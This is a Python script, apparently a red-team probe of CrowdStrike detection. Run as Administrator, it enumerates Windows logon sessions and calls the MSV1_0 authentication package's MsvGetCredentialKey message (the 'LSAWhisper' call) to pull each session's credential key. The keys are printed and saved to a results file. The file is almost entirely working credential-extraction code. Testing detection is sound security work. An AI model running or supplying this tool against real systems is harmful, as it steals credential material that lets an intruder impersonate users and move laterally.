"""
lsa_gap_test.py
Tests CrowdStrike detection of LSA credential key extraction.
Works with standard Administrator — no SYSTEM/SeTcbPrivilege needed.
Uses LsaConnectUntrusted instead of LsaRegisterLogonProcess.

RUN as Administrator:
    python lsa_gap_test.py
"""

import ctypes
import ctypes.wintypes as wt
import sys, os, datetime

LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "lsa_gap_results.txt")
log = open(LOG_PATH, "w", encoding="utf-8")

def p(msg=""):
    print(msg)
    log.write(msg + "\n")
    log.flush()

NTSTATUS   = ctypes.c_long
STATUS_OK  = 0

class LSA_STRING(ctypes.Structure):
    _fields_ = [("Length", ctypes.c_ushort),
                ("MaximumLength", ctypes.c_ushort),
                ("Buffer", ctypes.c_char_p)]

class LUID(ctypes.Structure):
    _fields_ = [("LowPart", ctypes.c_ulong),
                ("HighPart", ctypes.c_long)]

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [("Length", ctypes.c_ushort),
                ("MaximumLength", ctypes.c_ushort),
                ("Buffer", ctypes.c_wchar_p)]

class SESSION_DATA(ctypes.Structure):
    _fields_ = [("Size", ctypes.c_ulong),
                ("LogonId", LUID),
                ("UserName", UNICODE_STRING),
                ("LogonDomain", UNICODE_STRING),
                ("AuthenticationPackage", UNICODE_STRING),
                ("LogonType", ctypes.c_ulong),
                ("Session", ctypes.c_ulong),
                ("Sid", ctypes.c_void_p),
                ("LogonTime", ctypes.c_int64),
                ("LogonServer", UNICODE_STRING),
                ("DnsDomainName", UNICODE_STRING),
                ("Upn", UNICODE_STRING)]

class CREDKEY_REQUEST(ctypes.Structure):
    _fields_ = [("MessageType", ctypes.c_ulong),
                ("LogonId", LUID)]

class CREDKEY_RESPONSE(ctypes.Structure):
    _fields_ = [("MessageType", ctypes.c_ulong),
                ("KeyType", ctypes.c_ulong),
                ("Key", ctypes.c_ubyte * 20)]

# Load secur32
sec = ctypes.WinDLL("secur32.dll")

# LsaConnectUntrusted — works as normal Admin, no SeTcbPrivilege needed
sec.LsaConnectUntrusted.restype  = NTSTATUS
sec.LsaConnectUntrusted.argtypes = [ctypes.POINTER(wt.HANDLE)]

sec.LsaLookupAuthenticationPackage.restype  = NTSTATUS
sec.LsaLookupAuthenticationPackage.argtypes = [wt.HANDLE,
    ctypes.POINTER(LSA_STRING), ctypes.POINTER(ctypes.c_ulong)]

sec.LsaCallAuthenticationPackage.restype  = NTSTATUS
sec.LsaCallAuthenticationPackage.argtypes = [wt.HANDLE, ctypes.c_ulong,
    ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p),
    ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(NTSTATUS)]

sec.LsaFreeReturnBuffer.restype  = NTSTATUS
sec.LsaFreeReturnBuffer.argtypes = [ctypes.c_void_p]

sec.LsaEnumerateLogonSessions.restype  = NTSTATUS
sec.LsaEnumerateLogonSessions.argtypes = [ctypes.POINTER(ctypes.c_ulong),
    ctypes.POINTER(ctypes.POINTER(LUID))]

sec.LsaGetLogonSessionData.restype  = NTSTATUS
sec.LsaGetLogonSessionData.argtypes = [ctypes.POINTER(LUID),
    ctypes.POINTER(ctypes.POINTER(SESSION_DATA))]

sec.LsaDeregisterLogonProcess.restype  = NTSTATUS
sec.LsaDeregisterLogonProcess.argtypes = [wt.HANDLE]

def lsa_str(s):
    b = s.encode("ascii")
    ls = LSA_STRING(); ls.Buffer = b
    ls.Length = len(b); ls.MaximumLength = len(b)+1
    return ls

def run_test(luid):
    handle = wt.HANDLE()
    pkg_id = ctypes.c_ulong(0)

    # STEP 1 — LsaConnectUntrusted (untrusted client, works as Admin)
    p("[*] STEP 1: LsaConnectUntrusted")
    st = sec.LsaConnectUntrusted(ctypes.byref(handle))
    if st != STATUS_OK:
        p(f"    [-] FAILED: 0x{st & 0xFFFFFFFF:08X}")
        return False
    p(f"    [+] OK  handle=0x{handle.value:X}")

    # STEP 2 — Resolve MSV1_0 package
    p("[*] STEP 2: LsaLookupAuthenticationPackage (MSV1_0)")
    n = lsa_str("MICROSOFT_AUTHENTICATION_PACKAGE_V1_0")
    st = sec.LsaLookupAuthenticationPackage(handle, ctypes.byref(n), ctypes.byref(pkg_id))
    if st != STATUS_OK:
        p(f"    [-] FAILED: 0x{st & 0xFFFFFFFF:08X}")
        sec.LsaDeregisterLogonProcess(handle)
        return False
    p(f"    [+] OK  package_id={pkg_id.value}")

    # STEP 3 — MsvGetCredentialKey (0x37) — the LSAWhisper call
    p("[*] STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey=0x37)")
    p(f"    LUID: 0x{luid.HighPart:X}:0x{luid.LowPart:X}")

    req = CREDKEY_REQUEST()
    req.MessageType = 0x37
    req.LogonId = luid

    resp_ptr   = ctypes.c_void_p(0)
    resp_len   = ctypes.c_ulong(0)
    sub_status = NTSTATUS(0)

    st = sec.LsaCallAuthenticationPackage(
        handle, pkg_id.value,
        ctypes.byref(req), ctypes.sizeof(req),
        ctypes.byref(resp_ptr), ctypes.byref(resp_len),
        ctypes.byref(sub_status))

    if st != STATUS_OK:
        p(f"    [-] Outer FAILED: 0x{st & 0xFFFFFFFF:08X}")
    elif sub_status.value != STATUS_OK:
        p(f"    [-] Inner FAILED: 0x{sub_status.value & 0xFFFFFFFF:08X} (session ended or access denied)")
    elif resp_ptr.value:
        resp = ctypes.cast(resp_ptr, ctypes.POINTER(CREDKEY_RESPONSE)).contents
        key  = bytes(resp.Key).hex().upper()
        p(f"    [+] OK  {resp_len.value} bytes")
        p(f"")
        p(f"    ╔══════════════════════════════════════╗")
        p(f"    ║  CREDENTIAL KEY EXTRACTED            ║")
        p(f"    ╠══════════════════════════════════════╣")
        p(f"    ║  Key:     {key:<28} ║")
        p(f"    ║  Type:    {resp.KeyType}  (1=Local  2=Domain)    ║")
        p(f"    ╚══════════════════════════════════════╝")
        sec.LsaFreeReturnBuffer(resp_ptr)

    sec.LsaDeregisterLogonProcess(handle)
    return st == STATUS_OK and sub_status.value == STATUS_OK

def main():
    p("=" * 50)
    p("  LSA Gap Test — CrowdStrike Detection Probe")
    p(f"  {datetime.datetime.now()}")
    p("=" * 50)
    p(f"[*] Results saved to: {LOG_PATH}")

    count    = ctypes.c_ulong(0)
    sessions = ctypes.POINTER(LUID)()
    st = sec.LsaEnumerateLogonSessions(ctypes.byref(count), ctypes.byref(sessions))
    if st != STATUS_OK:
        p(f"[-] Enumerate failed: 0x{st&0xFFFFFFFF:08X}")
        return

    p(f"[*] Found {count.value} sessions\n")

    for i in range(count.value):
        data_ptr = ctypes.POINTER(SESSION_DATA)()
        luid = sessions[i]
        st = sec.LsaGetLogonSessionData(ctypes.byref(luid), ctypes.byref(data_ptr))
        if st != STATUS_OK or not data_ptr:
            continue
        d = data_ptr.contents
        if d.LogonType in (2, 3, 5):
            user   = d.UserName.Buffer    or ""
            domain = d.LogonDomain.Buffer or ""
            p(f"─── Session {i+1}/{count.value}  LUID=0x{luid.LowPart:X}  Type={d.LogonType}  {domain}\\{user}")
            run_test(luid)
            p("")
        sec.LsaFreeReturnBuffer(data_ptr)

    sec.LsaFreeReturnBuffer(sessions)
    p("\n[*] Done. Check lsa_gap_results.txt")
    log.close()

if __name__ == "__main__":
    main()
